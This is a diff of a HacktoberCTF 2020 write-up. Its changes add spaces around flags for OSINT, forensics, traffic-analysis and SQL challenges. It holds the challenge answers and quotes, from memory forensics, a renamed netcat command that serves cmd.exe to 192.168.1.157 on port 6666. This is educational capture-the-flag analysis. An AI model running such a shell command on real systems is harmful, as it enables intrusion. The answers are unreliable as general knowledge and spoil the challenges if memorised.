@@ -50,7 +50,7 @@ Looking around the website we see nothing, went to the DevConsole and checked th
   <img src="/images/writeups/HacktoberCTF/Web/2_js.png" width="500"/>
 </p>
 
-```flag{w3lcome_t0_d34df4ce}```
+```flag: flag{w3lcome_t0_d34df4ce} ```
 
 ---
 
@@ -86,7 +86,7 @@ On Facebook we can see the company he is working for.
   <img src="/images/writeups/HacktoberCTF/OSINT/Creeping/4_facebook.png" width="500"/>
 </p>
 
-```flag: flag{F. Kreuger Financial}```
+```flag: flag{F. Kreuger Financial} ```
 
 
 
@@ -100,7 +100,7 @@ Submit the flag in the following format: flag{Chief Executive Officer}
 
 From the previous Facebook screenshot, we can see his position at the company:
 
-```flag: flag{Senior Acquisitions Supervisor}```
+```flag: flag{Senior Acquisitions Supervisor} ```
 
 
 
@@ -118,7 +118,7 @@ On his facebook we can check his first post were the birthdate can be spotted:
   <img src="/images/writeups/HacktoberCTF/OSINT/Creeping3/1_date.png" width="500"/>
 </p>
 
-```flag: flag{17 jun 1973}```
+```flag: flag{17 jun 1973} ```
 
 
 
@@ -136,7 +136,7 @@ We can see this [statue](https://www.facebook.com/photo/?fbid=126468515816065&se
   <img src="/images/writeups/HacktoberCTF/OSINT/Creeping4/1_museum.png" width="500"/>
 </p>
 
-```flag{Point Pleasant, WV}```
+``` flag{Point Pleasant, WV} ```
 
 
 
@@ -154,7 +154,7 @@ Google: _attack that has hit financial institutions poland_
 
 I got this [website](https://securereading.com/malware-hit-polish-bank-targeted-more-than-100-financial-organizations/) were talks about an attack name watering hole.
 
-```flag: flag{watering hole}```
+``` flag: flag{watering hole} ```
 
 
 
@@ -222,7 +222,7 @@ kali@kali:~/Desktop/CTFs/HacktoberCTF/Stego/Blasphemy$ bat secret.txt.o
 
 There we have it:
 
-```flag: flag{950634ccc97ca3ef03e22c759a356973}```
+``` flag: flag{950634ccc97ca3ef03e22c759a356973} ```
 
 
 
@@ -245,7 +245,7 @@ The one named 1CC3B showed the following:
   <img src="/images/writeups/HacktoberCTF/OSINT/StartDigging/1_flag.png" width="500"/>
 </p>
 
-```flag: flag{buried_s3cr3ts}```
+``` flag: flag{buried_s3cr3ts} ```
 
 
 
@@ -278,7 +278,7 @@ Decode this: TGG KUSJWV QGM
 
 We can use [dCode](https://www.dcode.fr/caesar-cipher) and paste the text. We can see that +18 leads into: BOO SCARED YOU
 
-```flag: flag{BOO SCARED YOU}```
+``` flag: flag{BOO SCARED YOU} ```
 
 
 
@@ -311,7 +311,7 @@ REMEMBER TO TELL SPOOKY BOI ABOUT THE NEW TARGET SO FOUR NEXT ATTACK
 
 Who it's intended for?
 
-```flag: flag{SPOOKY BOI}```
+``` flag: flag{SPOOKY BOI} ```
 
 
 
@@ -325,7 +325,7 @@ Decode this: ZmxhZ3tzaG91bGRhX21hZGVfdGhpc19vbmVfaGFyZGVyfQ==
 
 A quick base64 on [CyberChef](https://gchq.github.io/CyberChef/):
 
-```flag{shoulda_made_this_one_harder}```
+``` flag{shoulda_made_this_one_harder} ```
 
 
 
@@ -353,7 +353,7 @@ Let's render it:
   <img src="/images/writeups/HacktoberCTF/Crypto/BoneToPick/index.png" width="500"/>
 </p>
 
-```flag: flag{angrybones}```
+``` flag: flag{angrybones} ```
 
 
 
@@ -408,7 +408,7 @@ Offset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wo
 
 We can look for memory capture tools on windows 10, and we decided to check the string 'mem' and 'dmp' to look for it. We can check out the last process [winpmem](https://github.com/google/rekall/tree/master/tools/windows/winpmem) can be out target. Therefore:
 
-```flag: flag{3348}```
+``` flag: flag{3348} ```
 
 
 
@@ -443,7 +443,7 @@ Unassociated,0006c7ceeec1327cc6910fc8e416acd3e06b00000904,2018-08-08 05:21:15,4a
 
 We can see the program installed was python:
 
-```flag: flag{python}```
+``` flag: flag{python} ```
 
 
 
@@ -469,7 +469,7 @@ Checking the last run date on the details:
 
 Ok. I got that flag wrong, thankfully, I had [@Razvi](https://razvioverflow.github.io/) and spotted the error.
 
-```flag: flag{2017-05-01 23:11:41}```
+``` flag: flag{2017-05-01 23:11:41} ```
 
 
 
@@ -556,7 +556,7 @@ Base                             Size          LoadCount LoadTime               
 
 Check out the command line of the last explorer.exe with the -lnvp 6666... seems like malicious. Therefore:
 
-```flag: flag{explorer.exe}```
+``` flag: flag{explorer.exe} ```
 
 
 
@@ -600,7 +600,7 @@ Name                                                  Pid   PPid   Thds   Hnds T
 
 We can get the PPID of the explorer.exe and the process with that PID is cmd.exe:
 
-```flag: flag{cmd.exe_3944}```
+``` flag: flag{cmd.exe_3944} ```
 
 
 
@@ -614,7 +614,7 @@ Use the file from Captured Memories.
 
 Check bonus challenge: Public Service where I retrieved the MD5 hash:
 
-```flag: flag{360b48f831d9beb41544b45d0aa66b8a}```
+``` flag: flag{360b48f831d9beb41544b45d0aa66b8a} ```
 
 
 
@@ -648,7 +648,7 @@ Command line : explorer.exe  192.168.1.157 6666 -e cmd.exe
 
 Here we can see the commands executed with _cmdline_ option from volatility, there we could see the command:
 
-```flag: flag{explorer.exe  192.168.1.157 6666 -e cmd.exe}```
+``` flag: flag{explorer.exe  192.168.1.157 6666 -e cmd.exe} ```
 
 
 
@@ -682,7 +682,7 @@ We go to [VirusTotal](https://www.virustotal.com/gui/file/096740ce1bc9fa14ab07c1
   <img src="/images/writeups/HacktoberCTF/Forensic/CapturedMemories/1_comment.png" width="500"/>
 </p>
 
-```flag: flag{h4cktober_ctf_2020_nc}```
+``` flag: flag{h4cktober_ctf_2020_nc} ```
 
 
 
@@ -709,7 +709,7 @@ On wireshark we can check out the HTTP GET request:
   <img src="/images/writeups/HacktoberCTF/TrafficAnalysis/RemotelyAdministratedEvil/1_name.png" width="500"/>
 </p>
 
-```flag: flag{solut.exe} ```
+``` flag: flag{solut.exe} ```
 
 
 
@@ -739,7 +739,7 @@ kali@kali:~/Desktop/CTFs/HacktoberCTF/TrafficAnalysis/Evil$ md5sum picture4.png
 a95d24937acb3420ee94493db298b295  picture4.png
 ```
 
-```flag: flag{a95d24937acb3420ee94493db298b295} ```
+``` flag: flag{a95d24937acb3420ee94493db298b295} ```
 
 
 
@@ -757,7 +757,7 @@ We can check on the analysis the dll downloaded and the IP used to make the requ
   <img src="/images/writeups/HacktoberCTF/TrafficAnalysis/BoneToPick/1_export.png" width="500"/>
 </p>
 
-```flag: flag{205.185.125.104}```
+``` flag: flag{205.185.125.104} ```
 
 
 
@@ -785,7 +785,7 @@ I'm going easy on this. Used [sqlitebrowser](https://github.com/sqlitebrowser/sq
 
 We got like an MD5 hash. Head to [crackstation](https://crackstation.net/) and retrieve the password:
 
-```flag: flag{zxcvbnm}```
+``` flag: flag{zxcvbnm} ```
 
 
 
@@ -843,7 +843,7 @@ mysql> select email from users where first="LUCIA";
 
 We can look up with the name and retrieve the email:
 
-```flag: flag{luc1afer.h4vr0n@shallowgraveu.com} ```
+``` flag: flag{luc1afer.h4vr0n@shallowgraveu.com} ```
 
 
 
@@ -865,7 +865,7 @@ mysql> select count(*) from users;
 1 row in set (0.00 sec)
 ```
 
-```flag: flag{900}```
+``` flag: flag{900} ```
 
 
 
@@ -904,7 +904,7 @@ mysql> describe users;
 
 We can see the NULL column set on the middle attribute:
 
-```flag: flag{middle, DESCRIBE}```
+``` flag: flag{middle, DESCRIBE} ```
 
 
 
@@ -943,7 +943,7 @@ mysql> select count(*) from users where state_id=6 OR state_id=28;
 
 ```
 
-```flag: flag{select count(*) from users where state_id=6 OR state_id=28;}```
+``` flag: flag{select count(*) from users where state_id=6 OR state_id=28;} ```
 
 
 
@@ -1012,7 +1012,7 @@ mysql> select distinct course_id from term_courses where term_id=2;
 
 Use DISTINCT to retrieve unique values:
 
-```flag: flag{401}```
+``` flag: flag{401} ```
 
 
 
@@ -1035,7 +1035,7 @@ mysql> select count(*) from users where month(dob) = 10 and year(dob) < 2000 and
 +----------+
 1 row in set (0.00 sec)
 ```
-```flag: flag{32}```
+``` flag: flag{32} ```
 
 
 
@@ -1069,7 +1069,7 @@ mysql> select username from users where last='KRYSIAK';
 1 row in set (0.00 sec)
 ```
 
-```flag: flag{image.wa1k3624}```
+``` flag: flag{image.wa1k3624} ```
 
 
 ## Student Body
@@ -1151,7 +1151,7 @@ mysql> select count(*) from enrollments where term_crs_id in (select term_crs_id
 1 row in set (0.00 sec)
 ```
 
-```flag: flag{122_CLAUDEDARRACOTT}```
+``` flag: flag{122_CLAUDEDARRACOTT} ```
 
 
 
@@ -1187,7 +1187,7 @@ namespace GhostTown
     }
 {% endhighlight %}
 
-```flag: flag{Nothing Will Stop DEADFACE}```
+``` flag: flag{Nothing Will Stop DEADFACE} ```
 
 
 ## Trick or Treat
@@ -1231,7 +1231,7 @@ Smell my feet.
 flag{2f3ba6b5fb8bb84c33b584f981c2d13d}
 ```
 
-```flag: flag{2f3ba6b5fb8bb84c33b584f981c2d13d}```
+``` flag: flag{2f3ba6b5fb8bb84c33b584f981c2d13d} ```
 
 
 Thanks for reading!
